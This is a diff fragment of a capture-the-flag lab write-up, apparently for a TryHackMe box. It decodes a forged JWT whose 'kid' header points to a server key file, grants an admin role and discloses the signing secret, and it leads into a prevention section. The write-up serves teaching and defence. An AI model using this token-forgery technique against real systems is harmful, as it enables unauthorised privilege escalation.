@@ -292,6 +292,33 @@ Example forged JWT used in this lab:
 eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiIsImtpZCI6Ii92YXIvd3d3L2h0bWwvMTg4YWRlMS5rZXkifQ.eyJpc3MiOiJodHRwOi8vaGFtbWVyLnRobSIsImF1ZCI6Imh0dHA6Ly9oYW1tZXIudGhtIiwiaWF0IjoxNzcwNTg0MDIzLCJleHAiOjE3NzA1ODc2MjMsImRhdGEiOnsidXNlcl9pZCI6MSwiZW1haWwiOiJ0ZXN0ZXJAaGFtbWVyLnRobSIsInJvbGUiOiJhZG1pbiJ9fQ.3cm0ELDW_cOvXgbJkwh94XZPG7APVRECxWCEkjV9P0A
 ```
 
+Which in cleartext and without padding basically translates to:
+
+```json
+# Header
+{
+  "typ": "JWT",
+  "alg": "HS256",
+  "kid": "/var/www/html/188ade1.key"
+}
+
+# Payload
+{
+  "iss": "http://hammer.thm",
+  "aud": "http://hammer.thm",
+  "iat": 1770584023,
+  "exp": 1770587623,
+  "data": {
+    "user_id": 1,
+    "email": "tester@hammer.thm",
+    "role": "admin"
+  }
+}
+
+# Signed with secret:
+# 56058354efb3daa97ebab00fabd7a7d7
+```
+
 ## How this should have been prevented
 
 Built-in JWT library validation + common best practices would have stopped this chain:
